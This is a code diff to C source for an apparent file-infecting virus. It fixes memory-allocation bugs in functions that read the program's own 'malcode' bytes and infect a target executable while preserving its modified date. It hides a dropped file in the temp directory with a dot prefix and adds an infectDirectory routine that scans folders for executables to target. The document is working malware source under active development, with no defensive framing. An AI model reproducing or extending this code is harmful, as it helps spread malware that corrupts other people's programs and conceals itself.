@@ -5,22 +5,24 @@
 #include "settings.h"
 #include "os.h"
 #include "clonelib.h"
-
+#ifndef INT32_MAX
+	#define INT32_MAX 2147483647
+#endif
 
 Bytes* getOwnBytes(const char* arg0){	
 	//Get name of executable
 	char* execname;
 	#ifdef _WIN32
 		if(strcmp(getFileExtension(arg0),"exe\0")){
-			execname=(char*)malloc(sizeof(char*)*(strlen(arg0)+4));
+			execname=(char*)malloc(sizeof(char)*(strlen(arg0)+4));
 			strcpy(execname,arg0);
 			strcat(execname,".exe");
 		}else{
-			execname=(char*)malloc(sizeof(char*)*strlen(arg0));
+			execname=(char*)malloc(sizeof(char)*strlen(arg0));
 			strcpy(execname,arg0);
 		}
 	#else
-		execname=(char*)malloc(sizeof(char*)*strlen(arg0));
+		execname=(char*)malloc(sizeof(char)*strlen(arg0));
 		strcpy(execname,arg0);
 	#endif
 
@@ -34,13 +36,13 @@ Bytes* getOwnBytes(const char* arg0){
 	fseek(malfile,0,SEEK_SET);
 	
 	//Get malcode
-	char* malcode=(char*)malloc(sizeof(char*)*malsize);
+	char* malcode=(char*)malloc(sizeof(char)*malsize);
 	fread(malcode,1,malsize,malfile);
 	fclose(malfile);
 	
 	//Put into bytes
-	Bytes* bytes=(Bytes*)malloc(sizeof(Bytes*));
-	bytes->value=(char*)malloc(sizeof(char*)*malsize);
+	Bytes* bytes=(Bytes*)malloc(sizeof(Bytes));
+	bytes->value=(char*)malloc(sizeof(char)*malsize);
 	for(unsigned int i=0;i<malsize;i++){
 		bytes->value[i]=malcode[i];
 	}
@@ -62,7 +64,7 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	
 	//Get temp directory
 	#ifdef _WIN32
-		char* tempdir=(char*)malloc(sizeof(char*)*strlen(getenv("TEMP")));
+		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
 		strcpy(tempdir,getenv("TEMP"));
 	#else
 		char* tempdir="/tmp";
@@ -71,13 +73,13 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	//Get info from target file
 	int64_t tardate=getFileModifiedDate(target);
 	
-	//Read target file
+	//Opentarget file
 	FILE* tarfile=fopen(target,"rb");
 	if(tarfile==NULL)return 0;
 	fseek(tarfile,0,SEEK_END);
 	unsigned int tarsize=ftell(tarfile);
 	fseek(tarfile,0,SEEK_SET);
-	char* tarcode=(char*)malloc(sizeof(char*)*tarsize);
+	char* tarcode=(char*)malloc(sizeof(char)*tarsize);
 	fread(tarcode,1,tarsize,tarfile);
 	fclose(tarfile);
 	
@@ -92,7 +94,7 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	//Find link path
 	char* linkpath=(char*)malloc(LINK_TAG_LENGTH+1+strlen(tempdir));
 	strcpy(linkpath,tempdir);
-	strcat(linkpath,"/");
+	strcat(linkpath,"/.");
 	strcat(linkpath,linkcode);
 	strcat(linkpath,".exe");
 	
@@ -117,4 +119,36 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	free(tarcode);
 	free(tempdir);
 	return 1;
+}
+
+bool infectDirectory(const char* path, const char* arg0){
+	//Get rid of warning
+	printf("%s\r",arg0);
+	
+	//Get list of files
+	char** ls=walkDir(path);
+	
+	//Go through files
+	for(unsigned int i=0;strcmp(ls[i],"\0");i++){
+		
+		//Check if possible executable
+		if(!strcmp(getFileExtension(ls[i]),"\0") || !strcmp(getFileExtension(ls[i]),"exe\0")){
+			
+			//Make sure under 2 GB
+			if(getFileSize(ls[i])<=INT32_MAX){
+				
+				//Check if definite executable
+				Executable* exectype=getExecType(ls[i]);
+				if(exectype->is_exec){	
+					printf("%s\n",ls[i]);
+				}
+				//Free memory
+				free(exectype);
+				free(ls[i]);
+			}
+		}
+	}
+	
+	free(ls);
+	return true;
 }
